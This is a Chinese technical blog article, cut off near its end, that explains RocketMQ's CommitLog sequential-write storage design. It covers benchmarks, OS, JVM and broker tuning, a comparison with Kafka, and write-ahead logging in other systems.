pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言：高性能是怎么做到的？</h2>
<p>RocketMQ是阿里巴巴开源的消息中间件，在阿里内部承载着电商、支付、物流等核心业务的海量消息流量。</p>
<p>根据官方文档和社区实践，单机性能大致在<strong>几千到几万TPS</strong>，优化后可达<strong>十万级别</strong>。即使是普通配置的几千TPS，对于大多数业务场景也已经足够。</p>
<p>那么问题来了：这个性能是怎么做到的？</p>
<p>答案在源码中：支撑这个性能的核心，是一个看起来很简单的设计决策：</p>
<p><strong>所有Topic的消息，都写到同一个文件里，顺序追加。</strong></p>
<p>这个设计叫做CommitLog。它是RocketMQ存储层的基石，也是理解整个RocketMQ架构的起点。</p>
<p>今天我们就来拆解这个设计：它是什么？为什么要这样设计？性能到底有多好？更重要的是，<strong>要达到这个性能需要什么条件？</strong></p>
<h2 data-id="heading-1">一、CommitLog是什么？</h2>
<h3 data-id="heading-2">1.1 核心设计</h3>
<p>CommitLog的设计很简单：<strong>一个文件，顺序追加，所有Topic的消息共用。</strong></p>
<p>类比笔记本：不管是订单、日志还是通知消息，都直接在笔记本最后一页往下写，不分类。</p>
<pre><code class="hljs language-ini" lang="ini">CommitLog文件：
<span class="hljs-section">[订单消息-001]</span> ← Topic: order
<span class="hljs-section">[日志消息-001]</span> ← Topic: log  
<span class="hljs-section">[订单消息-002]</span> ← Topic: order
<span class="hljs-section">[通知消息-001]</span> ← Topic: notify
...
</code></pre>
<h3 data-id="heading-3">1.2 消息存储格式</h3>
<p>每条消息包含13个字段，定长字段在前（48字节），变长字段在后：</p>
<pre><code class="hljs language-scss" lang="scss">定长部分（<span class="hljs-number">48</span>字节）：
- <span class="hljs-built_in">TOTALSIZE</span>(<span class="hljs-number">4</span>) + <span class="hljs-built_in">MAGICCODE</span>(<span class="hljs-number">4</span>) + <span class="hljs-built_in">BODYCRC</span>(<span class="hljs-number">4</span>) + <span class="hljs-built_in">QUEUEID</span>(<span class="hljs-number">4</span>)
- <span class="hljs-built_in">QUEUEOFFSET</span>(<span class="hljs-number">8</span>) + <span class="hljs-built_in">PHYSICALOFFSET</span>(<span class="hljs-number">8</span>)
- <span class="hljs-built_in">BORNTIMESTAMP</span>(<span class="hljs-number">8</span>) + <span class="hljs-built_in">STORETIMESTAMP</span>(<span class="hljs-number">8</span>)

变长部分：
- Topic + <span class="hljs-selector-tag">Body</span> + Properties
</code></pre>
<p>定长在前的设计让解析很快：先读48字节，就知道后面变长部分有多长。</p>
<h3 data-id="heading-4">1.3 文件管理</h3>
<p>CommitLog不是单个无限大的文件，而是多个1GB文件组成的队列：</p>
<pre><code class="hljs language-ini" lang="ini">$ROCKETMQ_HOME/store/commitlog/
├── 00000000000000000000  (第1个，<span class="hljs-attr">offset</span>=<span class="hljs-number">0</span>)
├── 00000001073741824     (第2个，<span class="hljs-attr">offset</span>=<span class="hljs-number">1</span>GB)
├── 00000002147483648     (第3个，<span class="hljs-attr">offset</span>=<span class="hljs-number">2</span>GB)
</code></pre>
<p>文件名即起始偏移量。当前文件写满1GB后，自动创建新文件继续追加。</p>
<h3 data-id="heading-5">1.4 核心写入逻辑</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> AppendResult <span class="hljs-title function_">putMessage</span><span class="hljs-params">(Message msg)</span> {
    putMessageLock.lock();  <span class="hljs-comment">// 1. 加锁</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">MappedFile</span> <span class="hljs-variable">mappedFile</span> <span class="hljs-operator">=</span> getLastMappedFile();  <span class="hljs-comment">// 2. 获取当前文件</span>
        <span class="hljs-keyword">if</span> (mappedFile.isFull()) {
            mappedFile = createNewFile();  <span class="hljs-comment">// 3. 文件满了就创建新文件</span>
        }
        <span class="hljs-keyword">return</span> mappedFile.appendMessage(msg);  <span class="hljs-comment">// 4. 追加消息</span>
    } <span class="hljs-keyword">finally</span> {
        putMessageLock.unlock();
    }
}
</code></pre>
<p>整个流程：加锁 → 找文件 → 追加 → 解锁。没有复杂的索引更新，没有B树维护，就是往文件末尾写数据。</p>
<h2 data-id="heading-6">二、为什么要这样设计？</h2>
<h3 data-id="heading-7">2.1 为什么不是每个Topic一个文件？</h3>
<p>按常规思路，应该每个Topic一个文件：</p>
<pre><code class="hljs language-c" lang="c">订单Topic → order.<span class="hljs-built_in">log</span>
日志Topic → <span class="hljs-built_in">log</span>.<span class="hljs-built_in">log</span>
通知Topic → notify.<span class="hljs-built_in">log</span>
</code></pre>
<p>这样读写都方便。但RocketMQ没这么做，原因是<strong>性能会崩掉</strong>。</p>
<h3 data-id="heading-8">2.2 多文件方案的问题</h3>
<p>问题不在应用层并发度，而在磁盘物理特性。</p>
<p><strong>HDD的物理限制：</strong></p>
<p>即使应用层用1000个线程写1000个文件，磁盘层仍然串行：</p>
<pre><code class="hljs language-scss" lang="scss">应用层：<span class="hljs-number">1000</span>线程并发写
    ↓
磁盘层：磁头串行跳跃
    → file-<span class="hljs-number">1</span> (寻道<span class="hljs-number">10ms</span>)
    → file-<span class="hljs-number">2</span> (寻道<span class="hljs-number">10ms</span>)
    → file-<span class="hljs-number">3</span> (寻道<span class="hljs-number">10ms</span>)
</code></pre>
<p>1000个Topic场景，性能对比：</p>
<pre><code class="hljs language-diff" lang="diff">多文件（HDD）：
<span class="hljs-deletion">- 磁头跳跃1000次</span>
<span class="hljs-deletion">- 每次寻道10-15ms  </span>
<span class="hljs-deletion">- 性能：100-1000 msg/s</span>

单文件（HDD）：
<span class="hljs-deletion">- 磁头固定，连续写</span>
<span class="hljs-deletion">- 充分利用带宽：100-150 MB/s</span>
<span class="hljs-deletion">- 性能：50,000-80,000 msg/s</span>

差距：50-800倍
</code></pre>
<p><strong>SSD也有问题：</strong></p>
<p>虽然SSD没有磁头，但多文件仍有开销：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 文件元数据开销（inode、时间戳）
<span class="hljs-bullet">2.</span> PageCache碎片化（1000个缓冲区，命中率低）
<span class="hljs-bullet">3.</span> SSD内部GC和写放大

性能对比：
多文件（SSD）：10,000-50,000 msg/s
单文件（SSD）：100,000-300,000 msg/s
差距：5-30倍
</code></pre>
<h3 data-id="heading-9">2.3 顺序写 vs 随机写的本质</h3>
<p>为什么差距这么大？核心原因是磁盘的物理特性。</p>
<p><strong>机械硬盘（HDD）的痛点：</strong></p>
<p>磁盘是一个圆盘，数据存储在盘片的不同位置。要写入数据，磁头需要移动到对应位置。</p>
<pre><code class="hljs language-bash" lang="bash">顺序写：
磁头固定在一个位置，数据连续写入
→ 无需移动磁头
→ 充分利用盘片旋转速度
→ 吞吐量：100-200 MB/s

随机写：
磁头需要不断移动到不同位置
→ 每次移动耗时10-15ms（寻道时间，即磁头移动到目标位置的时间）
→ 每秒最多移动100次
→ 吞吐量：5-10 MB/s
</code></pre>
<p><strong>固态硬盘（SSD）的差异：</strong></p>
<p>SSD没有物理移动部件，随机写性能好很多，但顺序写仍然有优势：</p>
<pre><code class="hljs language-bash" lang="bash">顺序写：300-500 MB/s
随机写：200-300 MB/s
差距：1.5-2倍
</code></pre>
<p>虽然差距没有HDD那么夸张，但在多Topic场景下，差距会被放大。</p>
<h3 data-id="heading-10">2.4 PageCache的威力</h3>
<p>还有一个关键因素：<strong>PageCache（页缓存）</strong>。</p>
<p>操作系统会把磁盘文件缓存在内存中。当你写入文件时，实际上是写入PageCache，然后操作系统异步刷到磁盘。</p>
<p><strong>顺序写的PageCache优势：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">CommitLog（单文件）：</span>
<span class="hljs-string">所有消息连续写入</span> <span class="hljs-string">→</span> <span class="hljs-string">PageCache连续</span> <span class="hljs-string">→</span> <span class="hljs-string">命中率高</span>

<span class="hljs-string">多文件：</span>
<span class="hljs-number">1000</span><span class="hljs-string">个文件分散写入</span> <span class="hljs-string">→</span> <span class="hljs-string">PageCache分散</span> <span class="hljs-string">→</span> <span class="hljs-string">命中率低</span>
</code></pre>
<p>PageCache的命中率，直接影响读写性能。顺序写让数据在内存中连续，预读机制更有效，缓存淘汰更少。</p>
<p>这就是为什么RocketMQ要用单文件顺序写。</p>
<h2 data-id="heading-11">三、性能验证：手写测试对比</h2>
<p>理论说再多，不如实测来得直接。</p>
<p>我参考RocketMQ的设计，手写了一个简化版的CommitLog，用mmap（内存映射文件，避免用户态/内核态数据拷贝）实现顺序写。然后写了个对比测试，看看顺序写和随机写到底差多少。</p>
<h3 data-id="heading-12">3.1 测试场景</h3>
<p><strong>测试环境：</strong></p>
<ul>
<li>操作系统：macOS 14.3.1</li>
<li>磁盘：SSD</li>
<li>测试数据：10万条消息，每条1KB，共97MB</li>
</ul>
<p><strong>顺序写实现：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 使用mmap，顺序追加</span>
<span class="hljs-type">MappedByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> fileChannel.map(MapMode.READ_WRITE, <span class="hljs-number">0</span>, fileSize);
<span class="hljs-keyword">for</span> (Message msg : messages) {
    buffer.put(encodeMessage(msg));  <span class="hljs-comment">// 顺序追加</span>
}
</code></pre>
<p><strong>随机写实现：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 预分配文件，随机位置写入</span>
<span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(<span class="hljs-string">"random.log"</span>, <span class="hljs-string">"rw"</span>);
file.setLength(fileSize);  <span class="hljs-comment">// 预分配空间</span>
<span class="hljs-keyword">for</span> (Message msg : messages) {
    <span class="hljs-type">long</span> <span class="hljs-variable">randomPos</span> <span class="hljs-operator">=</span> random.nextLong(fileSize);
    file.seek(randomPos);
    file.write(encodeMessage(msg));  <span class="hljs-comment">// 随机写入</span>
}
</code></pre>
<h3 data-id="heading-13">3.2 测试结果</h3>
<p>测试环境：SSD，数据量97MB（10万条×1KB）</p>




















<table><thead><tr><th>指标</th><th>顺序写</th><th>随机写</th></tr></thead><tbody><tr><td>总耗时</td><td>360 ms</td><td>267 ms</td></tr><tr><td>吞吐量</td><td>271 MB/s</td><td>365 MB/s</td></tr></tbody></table>
<p><strong>为什么随机写更快？</strong></p>
<p>这是SSD + 小数据量 + 文件预分配的特殊情况：</p>
<ol>
<li>SSD随机写性能接近顺序写（差距仅1.2-2倍）</li>
<li>97MB完全在PageCache中，未触发真实磁盘IO</li>
<li>随机写提前预分配文件，避免了元数据更新开销</li>
</ol>
<p><strong>HDD环境的理论对比：</strong></p>
<pre><code class="hljs language-bash" lang="bash">顺序写：100-150 MB/s，性能 100,000-150,000 msg/s
随机写：每次寻道10-15ms，性能 5,000-10,000 msg/s
差距：10-30倍
</code></pre>
<p>结论：SSD上随机写不慢，但顺序写仍有优势。真正差距体现在多Topic、大数据量、定期刷盘（将内存中的数据强制写入磁盘）的场景。</p>
<h3 data-id="heading-14">3.3 生产场景对比</h3>
<p><strong>多Topic场景（HDD）：</strong></p>
<p>1000个Topic，每个Topic一个文件：</p>
<pre><code class="hljs language-bash" lang="bash">多文件：磁头跳跃，性能 100-1000 msg/s
单文件：顺序写入，性能 50,000-80,000 msg/s
差距：50-800倍
</code></pre>
<p><strong>定期刷盘场景（SSD）：</strong></p>
<p>每秒刷盘一次：</p>
<pre><code class="hljs language-bash" lang="bash">顺序写：数据连续，一次性刷盘，性能 100,000-200,000 msg/s
随机写：数据分散，多次刷盘，性能 10,000-20,000 msg/s  
差距：5-10倍
</code></pre>
<h3 data-id="heading-15">3.4 不刷盘的"假性能"</h3>
<p>SimpleCommitLog测试：</p>
<pre><code class="hljs language-bash" lang="bash">写入：10,000条
耗时：20 ms
TPS：500,000 msg/s
</code></pre>
<p>这个数据没有参考价值，因为：</p>
<ol>
<li>没有刷盘 - 宕机必丢数据</li>
<li>数据太小 - 完全在内存中</li>
<li>没有网络开销</li>
<li>没有索引构建</li>
</ol>
<p>加上刷盘 + 网络 + 索引后，真实性能：</p>
<pre><code class="hljs">异步刷盘（先返回成功，后台定时刷盘）：20,000-40,000 TPS
同步刷盘（等待刷盘完成才返回）：5,000-10,000 TPS
性能降低：10-100倍
</code></pre>
<p>看性能数据必须问清楚测试条件，不刷盘的数据没有意义。</p>
<h2 data-id="heading-16">四、设计权衡：单文件带来的挑战</h2>
<p>顺序写性能这么好，是不是就没有缺点了？</p>
<p>当然不是。任何设计都是权衡。</p>
<h3 data-id="heading-17">4.1 读取问题：如何快速找到某个Topic的消息？</h3>
<p>所有Topic的消息混在一起，消费者怎么读取？</p>
<p>难道要从头到尾扫描CommitLog，找出自己Topic的消息吗？那性能就炸了。</p>
<p><strong>RocketMQ的解决方案：ConsumeQueue索引</strong></p>
<pre><code class="hljs language-ini" lang="ini">CommitLog（物理存储）：
<span class="hljs-section">[订单-001]</span><span class="hljs-section">[日志-001]</span><span class="hljs-section">[订单-002]</span><span class="hljs-section">[通知-001]</span><span class="hljs-section">[日志-002]</span>...

ConsumeQueue（逻辑索引）：
订单Queue: <span class="hljs-section">[offset-0]</span><span class="hljs-section">[offset-2]</span>...
日志Queue: <span class="hljs-section">[offset-1]</span><span class="hljs-section">[offset-4]</span>...
通知Queue: <span class="hljs-section">[offset-3]</span>...
</code></pre>
<p>CommitLog只负责写入（顺序追加），ConsumeQueue负责索引（异步构建）。</p>
<p>消费者读取时：</p>
<ol>
<li>先读ConsumeQueue，找到消息在CommitLog的物理偏移量</li>
<li>再去CommitLog读取实际消息</li>
</ol>
<p>这就是<strong>读写分离</strong>：写入走CommitLog（顺序写），读取走ConsumeQueue（索引查找）。</p>
<h3 data-id="heading-18">4.2 空间问题：所有消息都存储，占用大</h3>
<p>每条消息都存在CommitLog中，不管有没有被消费，都要占用磁盘空间。</p>
<p><strong>RocketMQ的解决方案：定期清理</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 默认保留72小时</span>
fileReservedTime = <span class="hljs-number">72</span>

<span class="hljs-comment">// 磁盘使用率超过75%，强制删除</span>
diskMaxUsedSpaceRatio = <span class="hljs-number">75</span>
</code></pre>
<p>过期的CommitLog文件会被删除，释放空间。</p>
<h3 data-id="heading-19">4.3 单点瓶颈：顺序写只能单点</h3>
<p>CommitLog是单点顺序写，无法并行。这是性能的天花板。</p>
<p><strong>RocketMQ的解决方案：Broker分片</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Broker1: 处理 Topic A, B, C</span>
<span class="hljs-section">Broker2: 处理 Topic D, E, F</span>
<span class="hljs-section">Broker3: 处理 Topic G, H, I</span>
</code></pre>
<p>通过多个Broker横向扩展，每个Broker维护自己的CommitLog。</p>
<h3 data-id="heading-20">4.4 权衡总结</h3>



































<table><thead><tr><th>维度</th><th>单文件（CommitLog）</th><th>多文件（每Topic一个）</th></tr></thead><tbody><tr><td>写入性能</td><td>极高（顺序写）</td><td>极低（随机写）</td></tr><tr><td>读取性能</td><td>需要索引</td><td>直接读取</td></tr><tr><td>空间占用</td><td>所有消息都存储</td><td>可按Topic清理</td></tr><tr><td>扩展性</td><td>单点写入</td><td>天然分布式</td></tr><tr><td>复杂度</td><td>简单</td><td>管理复杂</td></tr></tbody></table>
<p>RocketMQ选择了<strong>写性能优先</strong>的策略，用ConsumeQueue索引解决读取问题，用定期清理解决空间问题，用Broker集群解决扩展问题。</p>
<p>这就是设计的艺术：<strong>抓住核心矛盾（写入性能），用其他方式弥补代价（读取、空间、扩展）</strong>。</p>
<h2 data-id="heading-21">五、性能不是免费的：要达到5万TPS需要什么？</h2>
<p>单纯的顺序写性能一般，最简单的实现：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 最简单的顺序写：每条都刷盘</span>
<span class="hljs-type">FileChannel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(<span class="hljs-string">"test.log"</span>, <span class="hljs-string">"rw"</span>).getChannel();

<span class="hljs-keyword">for</span> (Message msg : messages) {
    channel.write(ByteBuffer.wrap(msg.getBytes()));
    channel.force(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// 每条都刷盘</span>
}
</code></pre>
<p><strong>性能：500-1000 TPS</strong></p>
<p>差得远。</p>
<p>要达到RocketMQ的5万-20万TPS，需要一整套优化组合拳。</p>
<h3 data-id="heading-22">5.1 多线程模型</h3>
<p>RocketMQ采用多线程架构：</p>
<pre><code class="hljs">网络线程（Netty）：8-16个，处理网络IO
业务线程：8-16个，处理消息编码
刷盘线程：1个后台线程，异步批量刷盘
索引线程：1个后台线程，构建ConsumeQueue
</code></pre>
<p>只有写入CommitLog时需要加锁，持有锁时间仅几微秒。其他环节都是并发处理。</p>
<h3 data-id="heading-23">5.2 批量处理</h3>
<p>批量处理是性能的关键：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 生产者批量发送</span>
producer.send(List&lt;Message&gt; msgs);  <span class="hljs-comment">// 100条/批</span>

<span class="hljs-comment">// Broker批量写入</span>
<span class="hljs-keyword">for</span> (Message msg : batch) {
    commitLog.putMessage(msg);
}

<span class="hljs-comment">// 定时批量刷盘</span>
flushIntervalCommitLog = <span class="hljs-number">500</span>  <span class="hljs-comment">// 500ms刷一次</span>
</code></pre>
<p>性能对比：</p>
<pre><code class="hljs">单条处理：163 TPS
批量处理（100条/批）：8,333 TPS  
批量处理（1000条/批）：8,695 TPS
多线程并发（8线程）：69,560 TPS
</code></pre>
<h3 data-id="heading-24">5.3 内核参数优化</h3>
<p>操作系统参数调优同样重要。以下参数来自社区实践，需根据实际环境调整：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 文件描述符</span>
<span class="hljs-built_in">ulimit</span> -n 1000000

<span class="hljs-comment"># TCP参数</span>
net.ipv4.tcp_rmem = 4096 87380 16777216
net.ipv4.tcp_wmem = 4096 65536 16777216
net.core.somaxconn = 65535

<span class="hljs-comment"># 虚拟内存（影响刷盘行为）</span>
vm.dirty_background_ratio = 5    <span class="hljs-comment"># 推荐5-10</span>
vm.dirty_ratio = 10               <span class="hljs-comment"># 推荐10-20  </span>
vm.dirty_writeback_centisecs = 100
vm.dirty_expire_centisecs = 500
vm.max_map_count = 655360

<span class="hljs-comment"># IO调度器</span>
<span class="hljs-built_in">echo</span> none &gt; /sys/block/nvme0n1/queue/scheduler         <span class="hljs-comment"># SSD</span>
<span class="hljs-built_in">echo</span> mq-deadline &gt; /sys/block/sda/queue/scheduler      <span class="hljs-comment"># HDD</span>

<span class="hljs-comment"># 文件系统</span>
mount -o noatime,nodiratime /dev/nvme0n1 /data/rocketmq
</code></pre>
<p>优化效果（根据社区反馈）：</p>
<pre><code class="hljs">优化前：10,000-15,000 TPS
优化后：30,000-50,000 TPS
提升：2-5倍
</code></pre>
<h3 data-id="heading-25">5.4 JVM参数优化</h3>
<pre><code class="hljs language-bash" lang="bash">-Xms8g -Xmx8g                    <span class="hljs-comment"># 堆内存8G</span>
-XX:+UseG1GC                     <span class="hljs-comment"># 使用G1GC</span>
-XX:MaxGCPauseMillis=50          <span class="hljs-comment"># 最大GC停顿50ms</span>
-XX:MaxDirectMemorySize=15g      <span class="hljs-comment"># 直接内存15G（mmap需要）</span>
-XX:-UseBiasedLocking            <span class="hljs-comment"># 关闭偏向锁</span>
</code></pre>
<p>15G直接内存用于：CommitLog (10GB) + ConsumeQueue (2GB) + IndexFile (1GB) + 余量 (2GB)</p>
<h3 data-id="heading-26">5.5 RocketMQ配置优化</h3>
<pre><code class="hljs language-properties" lang="properties"># 刷盘策略
flushDiskType = ASYNC_FLUSH
flushIntervalCommitLog = 500
flushCommitLogLeastPages = 4

# 文件预分配和预热
warmMapedFileEnable = true

# 堆外内存池
transientStorePoolEnable = true
transientStorePoolSize = 5

# 锁类型（false=自旋锁，低延迟）
useReentrantLockWhenPutMessage = false

# 线程池
sendMessageThreadPoolNums = 16
</code></pre>
<h3 data-id="heading-27">5.6 硬件配置</h3>
<p>推荐配置：</p>
<pre><code class="hljs language-bash" lang="bash">CPU：16核+，主频3GHz+
内存：32GB+（64GB推荐）
磁盘：NVMe SSD（3000-7000 MB/s）
网络：万兆网卡（10Gbps）
</code></pre>
<p>不同配置的性能：</p>





















<table><thead><tr><th>配置</th><th>TPS</th></tr></thead><tbody><tr><td>HDD + 8核16G</td><td>5,000</td></tr><tr><td>SSD + 16核32G</td><td>50,000</td></tr><tr><td>NVMe + 32核64G</td><td>200,000</td></tr></tbody></table>
<h3 data-id="heading-28">5.7 性能提升路径</h3>
<p>从简单到完整优化的路径：</p>
<pre><code class="hljs">最简单顺序写（每条刷盘）：500-1000 TPS
加上mmap（不刷盘）：50,000-100,000 TPS（不实用）
加上批量刷盘：10,000-20,000 TPS
加上多线程：30,000-50,000 TPS
加上批量处理：50,000-80,000 TPS
完整优化：100,000-200,000 TPS
</code></pre>
<p>顺序写只是基础，要达到生产级性能需要完整的优化组合。</p>
<h2 data-id="heading-29">六、对比：Kafka为什么能到单机100万TPS？</h2>
<p>有人说Kafka单机能到100万TPS，为什么RocketMQ只有20万？</p>
<p><strong>首先明确：Kafka单机100万TPS的测试条件</strong></p>
<ul>
<li>异步刷盘（与RocketMQ相同）</li>
<li>批量大小：16KB（RocketMQ默认4KB）</li>
<li>高配服务器：32核64G + NVMe SSD</li>
<li>单Topic或少量Topic（重要！）</li>
<li>Producer端压缩</li>
<li>消息大小：1KB</li>
</ul>
<p><strong>这是一个极限优化场景下的数据，不是常规性能。</strong></p>
<h3 data-id="heading-30">Kafka和RocketMQ的设计差异</h3>
<p>两者都是优秀的消息中间件，但设计目标不同：</p>
<p><strong>Kafka的设计选择（吞吐量优先）：</strong></p>
<ol>
<li>
<p><strong>更激进的批量策略</strong></p>
<ul>
<li>默认批量大小：16KB</li>
<li>延迟换吞吐量</li>
<li>适合：日志收集、流式处理</li>
</ul>
</li>
<li>
<p><strong>sendfile零拷贝</strong></p>
<ul>
<li>从PageCache直接发送给网卡</li>
<li>不经过用户空间</li>
<li>消费场景性能极佳</li>
</ul>
</li>
<li>
<p><strong>稀疏索引</strong></p>
<ul>
<li>索引颗粒度：4KB一个索引点</li>
<li>索引构建开销小</li>
<li>但查询粒度粗</li>
</ul>
</li>
<li>
<p><strong>简化的存储模型</strong></p>
<ul>
<li>每个Partition一个文件</li>
<li>顺序消费优化到极致</li>
<li>但按Key查询需要扫描</li>
</ul>
</li>
</ol>
<p><strong>RocketMQ的设计选择（功能丰富 + 低延迟）：</strong></p>
<ol>
<li>
<p><strong>细粒度索引</strong></p>
<ul>
<li>ConsumeQueue：20字节一个索引</li>
<li>IndexFile：支持按Key查询</li>
<li>Tag过滤在Broker端完成</li>
</ul>
</li>
<li>
<p><strong>丰富的功能</strong></p>
<ul>
<li>事务消息（Half Message + 回查）</li>
<li>延时消息（18个Level）</li>
<li>消息轨迹、消息过滤</li>
</ul>
</li>
<li>
<p><strong>更低的延迟</strong></p>
<ul>
<li>批量大小：4KB（可配置）</li>
<li>P99延迟：1-3ms</li>
<li>Kafka：5-10ms（批量导致）</li>
</ul>
</li>
<li>
<p><strong>Topic无关的性能</strong></p>
<ul>
<li>所有Topic共用CommitLog</li>
<li>Topic数量不影响写入性能</li>
<li>Kafka：Topic多会影响性能</li>
</ul>
</li>
</ol>
<h3 data-id="heading-31">性能对比（在各自擅长的场景）</h3>



































<table><thead><tr><th>场景</th><th>Kafka</th><th>RocketMQ</th></tr></thead><tbody><tr><td>日志收集（大批量）</td><td>100万+ TPS</td><td>20-30万 TPS</td></tr><tr><td>业务消息（小批量）</td><td>10-20万 TPS</td><td>10-30万 TPS</td></tr><tr><td>多Topic（1000+）</td><td>5-10万 TPS</td><td>20-30万 TPS</td></tr><tr><td>按Key查询消息</td><td>需要扫描</td><td>支持（IndexFile）</td></tr><tr><td>事务消息</td><td>不支持</td><td>支持</td></tr></tbody></table>
<h3 data-id="heading-32">结论：不是谁好谁坏，而是设计目标不同</h3>
<p><strong>Kafka适合：</strong></p>
<ul>
<li>日志收集、埋点上报</li>
<li>流式处理（大数据场景）</li>
<li>顺序消费为主</li>
<li>对延迟不敏感</li>
</ul>
<p><strong>RocketMQ适合：</strong></p>
<ul>
<li>业务消息（订单、支付、通知）</li>
<li>需要事务消息、延时消息</li>
<li>需要按Key查询、Tag过滤</li>
<li>对延迟敏感</li>
</ul>
<p><strong>两者都是优秀的设计，只是优化的方向不同。</strong></p>
<h2 data-id="heading-33">七、升华：WAL思想的通用性</h2>
<p>CommitLog的设计，本质上是**WAL（Write-Ahead Log）**模式的实现。</p>
<h3 data-id="heading-34">7.1 WAL的核心原则</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 先写日志（CommitLog）
   ↓
<span class="hljs-bullet">2.</span> 后建索引（ConsumeQueue）
   ↓
<span class="hljs-bullet">3.</span> 读写分离（写走日志，读走索引）
</code></pre>
<p><strong>关键点：</strong></p>
<ul>
<li><strong>顺序IO是王道</strong> - 充分利用磁盘特性</li>
<li><strong>先保证持久化，再优化查询</strong> - 写入与查询解耦</li>
<li><strong>日志与索引分离</strong> - 各司其职</li>
</ul>
<h3 data-id="heading-35">7.2 其他系统的WAL实现</h3>
<p>这个思想在很多系统中都有体现：</p>
<p><strong>MySQL的Redo Log：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">写入流程：
<span class="hljs-bullet">1.</span> 事务修改数据
<span class="hljs-bullet">2.</span> 先写Redo Log（顺序追加，保证持久性）
<span class="hljs-bullet">3.</span> 后写Undo Log（用于回滚，保证原子性）
<span class="hljs-bullet">4.</span> 最后刷Data Page（随机写）

崩溃恢复：
从Redo Log重放 → 恢复已提交事务
从Undo Log回滚 → 撤销未提交事务

核心：Redo Log的顺序写保证了事务持久性
</code></pre>
<p><strong>Kafka的Partition Log：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">存储结构：
<span class="hljs-bullet">1.</span> 每个Partition包括：Log Segment + Index文件
<span class="hljs-bullet">2.</span> Log Segment：消息本身（顺序追加）
<span class="hljs-bullet">3.</span> Index文件：稀疏索引（offset → 文件位置）

写入：
顺序追加到当前Segment

读取：
先查Index找到Segment位置 → 再读Log

索引特点：
每4KB消息建一个索引点（稀疏）
与RocketMQ的ConsumeQueue类似，但粒度更粗
</code></pre>
<p><strong>Redis的AOF：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">持久化：
<span class="hljs-bullet">1.</span> 每个写操作追加到AOF文件
<span class="hljs-bullet">2.</span> 顺序写入
<span class="hljs-bullet">3.</span> 定期重写压缩

恢复：
重放AOF文件 → 恢复内存数据
</code></pre>
<p><strong>HBase的WAL：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">写入流程：
<span class="hljs-bullet">1.</span> 先写WAL（HLog）
<span class="hljs-bullet">2.</span> 再写MemStore
<span class="hljs-bullet">3.</span> 最后刷到HFile

崩溃恢复：
从WAL重放 → 恢复MemStore
</code></pre>
<h3 data-id="heading-36">7.3 你的系统也可以用</h3>
<p>如果你在设计一个需要<strong>高吞吐量持久化</strong>的系统，WAL思想可能适合你：</p>
